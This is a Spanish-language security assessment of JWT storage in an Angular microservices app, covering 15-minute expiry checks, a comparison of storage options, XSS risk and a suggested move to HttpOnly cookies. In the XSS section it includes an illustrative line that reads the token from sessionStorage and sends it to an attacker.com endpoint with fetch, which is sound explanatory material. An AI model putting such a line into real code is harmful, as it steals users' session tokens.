# Evaluación de Seguridad: Almacenamiento de JWT, Expiración y Riesgo XSS

**Proyecto:** Tienda Genérica (Microservicios Distribuidos + Angular)  
**Fecha:** 2026-10-18  
**Autor:** Antigravity (Senior Full-Stack Engineer)  

---

## 1. Contexto y Requerimiento
Conforme a `docs/BACKEND.md:118` y las directrices de seguridad del sistema:
- Los tokens JWT se firman con HMAC-SHA256 (HS256) y tienen una vigencia estricta de **15 minutos** (900 segundos).
- El frontend debe detectar la expiración del token de forma proactiva y reactiva, redireccionando al usuario a la vista de autenticación (`/login`).
- Se evalúa la estrategia de almacenamiento del token en **Memoria (`Signals`) + `sessionStorage`**, detallando su comportamiento, ventajas y riesgos de Cross-Site Scripting (XSS).

---

## 2. Implementación de Detección de Expiración (15 minutos)

### A. Proactiva: Enrutamiento y Guards Funcionales (`authGuard`)
Antes de permitir el ingreso a cualquier ruta protegida (`/dashboard`, `/sales`, `/users`, etc.), el `authGuard` funcional verifica:
```typescript
if (auth.isAuthenticated() && !auth.isTokenExpired()) {
  return true;
}
auth.logout();
return router.parseUrl('/');
```
Si el claim `exp` del JWT es menor o igual al tiempo actual Unix (`Math.floor(Date.now() / 1000)`), el guard ejecuta `logout()` automáticamente y retorna un `UrlTree` hacia `/login`.

### B. Reactiva: Interceptor Funcional de Errores (`errorInterceptor`)
Si un token expira durante una sesión activa o el backend responde con código HTTP `401 Unauthorized`:
1. `errorInterceptor` intercepta la respuesta.
2. Invoca `authService.logout()`, limpiando el estado reactivo (`tokenSignal` y `currentUser`) y eliminando las claves de `sessionStorage`.
3. Redirecciona al usuario a `/login` con `router.navigate(['/'])`.

### C. Detección en Acceso de Token (`AuthService.getToken()`)
Cada vez que el `jwtInterceptor` o un componente consulta `getToken()`:
```typescript
getToken(): string | null {
  if (this.isTokenExpired()) {
    this.logout();
    return null;
  }
  return this.tokenSignal();
}
```
Garantiza que peticiones HTTP subsecuentes nunca utilicen un token caducado.

---

## 3. Análisis Comparativo de Estrategias de Almacenamiento de Tokens

| Criterio | Opción 1: Solo en Memoria (`Signals`) | Opción 2: Memoria + `sessionStorage` (Implementada) | Opción 3: `localStorage` | Opción 4: Cookies `HttpOnly` + `SameSite` |
|---|---|---|---|---|
| **Persistencia ante Recarga (F5)** | ❌ Se pierde la sesión | ✅ Se mantiene en la pestaña activa | ✅ Se mantiene indefinidamente | ✅ Se mantiene |
| **Aislamiento entre Pestañas** | Total (por instancia JS) | ✅ Aislado por pestaña/ventana | ❌ Compartido entre todas las pestañas | Compartido por origen |
| **Cierre de Pestaña/Navegador** | Inmediato | ✅ Se destruye automáticamente | ❌ Persiste hasta borrado explícito | Según directiva `Expires`/Session |
| **Vulnerabilidad a Robo por XSS** | 🛡️ Inmune a extracción por APIs de Storage | ⚠️ Vulnerable si hay XSS activo | ⚠️ Muy vulnerable a exfiltración persistente | 🛡️ Inmune (JavaScript no puede leer la cookie) |
| **Requisito en Backend** | Ninguno (o Silent Refresh) | Ninguno adicional | Ninguno adicional | Endpoint de Refresh Token y CORS `credentials: true` |

---

## 4. Evaluación del Riesgo XSS (Cross-Site Scripting)

### Naturaleza de la Amenaza
En una aplicación Single Page Application (SPA), cualquier vulnerabilidad de Cross-Site Scripting (Reflected, Stored o DOM-based) permite al atacante ejecutar código JavaScript arbitrario en el contexto del origen del usuario.

Si el token reside en `sessionStorage`:
```javascript
// Vector de exfiltración bajo XSS
const stolenToken = sessionStorage.getItem('tg_auth_token');
fetch('https://attacker.com/log?token=' + encodeURIComponent(stolenToken));
```

### Factores Mitigantes Implementados en la Arquitectura
1. **Ventana de Exposición Ultracorta (15 minutos):**
   - El token expira automáticamente a los 15 minutos de su emisión. A diferencia de esquemas con tokens de días o semanas, el valor de un token exfiltrado es temporalmente marginal.
2. **Uso de `sessionStorage` frente a `localStorage`:**
   - `sessionStorage` nunca persiste en el disco de forma permanente.
   - El token no es accesible desde otras pestañas ni ventanas del navegador.
   - Se destruye tan pronto como el operador cierra la pestaña.
3. **Protección Contextual de Angular:**
   - Angular trata todos los valores interpolados (`{{ value }}`) y enlaces de propiedades (`[property]`) como no confiables de manera predeterminada, sanitizándolos y escapando caracteres HTML especiales.
   - En este proyecto **no se utiliza `bypassSecurityTrustHtml`**, `innerHTML` desprotegido ni manipulación directa con `ElementRef.nativeElement`.
4. **Validación de Roles en Backend (RBAC):**
   - El token contiene el rol (`ROLE_ADMIN` vs `ROLE_USER`). Los microservicios (`user-service`, `catalog-service`, etc.) validan la firma criptográfica y los roles en cada endpoint, previniendo elevación de privilegios incluso si un atacante obtuviera el token de un usuario operador.

---

## 5. Recomendación de Evolución Futura
Para una arquitectura bancaria o de misión crítica de nivel 3:
1. **Migración a Cookies `HttpOnly; Secure; SameSite=Strict`:**
   - La API de autenticación (`/api/users/login`) emitiría el token en un header `Set-Cookie` con bandera `HttpOnly`.
   - El navegador adjunta la cookie automáticamente en cada petición HTTP sin que JavaScript tenga acceso al valor del token.
2. **Rotación mediante Refresh Tokens:**
   - Implementar un refresh token de un solo uso para renovar el token de acceso sin solicitar credenciales nuevamente al usuario mientras mantenga actividad.
